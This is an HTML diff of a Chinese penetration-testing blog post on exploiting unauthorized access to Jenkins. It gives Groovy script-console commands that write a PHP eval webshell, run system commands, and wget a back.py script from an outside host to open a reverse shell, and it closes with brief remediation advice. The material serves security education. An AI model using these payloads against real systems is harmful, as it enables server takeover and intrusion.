@@ -371,9 +371,23 @@
 <li>4、限制ip登陆</li>
 </ul>
 <h2 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h2><h3 id="①-漏洞描述-1"><a href="#①-漏洞描述-1" class="headerlink" title="① 漏洞描述"></a>① 漏洞描述</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
-<h3 id="②-漏洞利用-1"><a href="#②-漏洞利用-1" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1、Jenkins未授权访问可执行命令"><a href="#1、Jenkins未授权访问可执行命令" class="headerlink" title="1、Jenkins未授权访问可执行命令"></a>1、Jenkins未授权访问可执行命令</h4><p>访问victim:8080/manage<br>victim:8080/script</p>
-<p><img src alt="/img/Jenkins/jenkins01"></p>
-	
+<h3 id="②-漏洞利用-1"><a href="#②-漏洞利用-1" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1、Jenkins未授权访问写webshell"><a href="#1、Jenkins未授权访问写webshell" class="headerlink" title="1、Jenkins未授权访问写webshell"></a>1、Jenkins未授权访问写webshell</h4><h5 id="1-1-访问"><a href="#1-1-访问" class="headerlink" title="1.1 访问"></a>1.1 访问</h5><p><code>victim:8080/manage</code><br><code>victim:8080/script</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4ok3o3vj30fe079dho.jpg" alt></p>
+<h5 id="1-2-点击脚本命令行"><a href="#1-2-点击脚本命令行" class="headerlink" title="1.2 点击脚本命令行"></a>1.2 点击脚本命令行</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4qv245zj30fe07o0uq.jpg" alt></p>
+<h5 id="1-3-执行系统命令，成功执行命令"><a href="#1-3-执行系统命令，成功执行命令" class="headerlink" title="1.3 执行系统命令，成功执行命令"></a>1.3 执行系统命令，成功执行命令</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4rpgvoij30fe096wf9.jpg" alt></p>
+<h5 id="1-4-上传webshell"><a href="#1-4-上传webshell" class="headerlink" title="1.4 上传webshell"></a>1.4 上传webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4tlu431j30fe0520tn.jpg" alt></p>
+<h5 id="1-5-点击运行，未报错，上传成功"><a href="#1-5-点击运行，未报错，上传成功" class="headerlink" title="1.5 点击运行，未报错，上传成功"></a>1.5 点击运行，未报错，上传成功</h5><h5 id="1-6-菜刀连接"><a href="#1-6-菜刀连接" class="headerlink" title="1.6 菜刀连接"></a>1.6 菜刀连接</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4uh4pufj30fe08774p.jpg" alt></p>
+<h4 id="2、执行系统命令"><a href="#2、执行系统命令" class="headerlink" title="2、执行系统命令"></a>2、执行系统命令</h4><h5 id="1）println-“ifconfig-a”-execute-text执行一些系统命令"><a href="#1）println-“ifconfig-a”-execute-text执行一些系统命令" class="headerlink" title="1）println “ifconfig -a”.execute().text执行一些系统命令"></a>1）println “ifconfig -a”.execute().text执行一些系统命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def sout = new StringBuffer(), serr = new StringBuffer()</span><br><span class="line"></span><br><span class="line">def proc = &apos;[INSERT COMMAND]&apos;.execute()</span><br><span class="line"></span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line"></span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line"></span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2）直接wget下载back-py反弹shell"><a href="#2）直接wget下载back-py反弹shell" class="headerlink" title="2）直接wget下载back.py反弹shell"></a>2）直接wget下载back.py反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http://xxx.victim.com/tools/back.py -P /tmp/&quot;.execute().text</span><br><span class="line"></span><br><span class="line">println &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<h3 id="③-漏洞修复-1"><a href="#③-漏洞修复-1" class="headerlink" title="③ 漏洞修复"></a>③ 漏洞修复</h3><ul>
+<li>1、禁止把Jenkins直接暴露在公网</li>
+<li>2、添加认证，设置强密码复杂度及账号锁定。</li>
+</ul>
+<h2 id="0x04-MongoDB未授权访问"><a href="#0x04-MongoDB未授权访问" class="headerlink" title="0x04 MongoDB未授权访问"></a>0x04 MongoDB未授权访问</h2>	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/img/random/100.jpg"></div>
